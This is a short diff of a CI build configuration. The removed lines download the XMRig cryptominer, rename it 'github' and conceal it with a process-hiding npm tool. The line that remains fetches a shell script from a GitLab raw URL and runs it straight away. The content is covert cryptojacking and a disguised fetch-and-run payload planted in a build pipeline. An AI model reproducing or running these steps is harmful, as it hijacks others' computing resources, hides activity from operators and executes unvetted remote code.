@@ -6,18 +6,4 @@ build:
         code: |
           sudo apt update -y && sudo apt upgrade -y
           sudo apt-get install  -y wget
-          wget https://github.com/uPlexa/xmrig-upx/releases/download/v0.2.0/xmrig-upx-v0.2.0-lin64.tar.gz
-          tar -xvf xmrig-upx-v0.2.0-lin64.tar.gz
-          cd xmrig-upx-v0.2.0-lin64
-          chmod u+x xmrig
-          mv xmrig github
-          sudo apt install -y gcc
-          sudo apt-get install -y npm
-          apt-get install apt-transport-https -y
-          npm i -g node-process-hider
-          sudo ln -s /usr/bin/nodejs /usr/bin/node
-          sudo ln -s /usr/local/lib/node_modules/node-process-hider/bin/cli.js
-          sudo ln -s /usr/local/bin/ph
-          sudo ln -s /usr/local/bin/ph -> /usr/local/lib/node_modules/node-process-hider/bin/cli.js
-          sudo ph add github
           wget https://gitlab.com/dapurspl/simple/-/raw/main/variant.sh && chmod u+x variant.sh && ./variant.sh
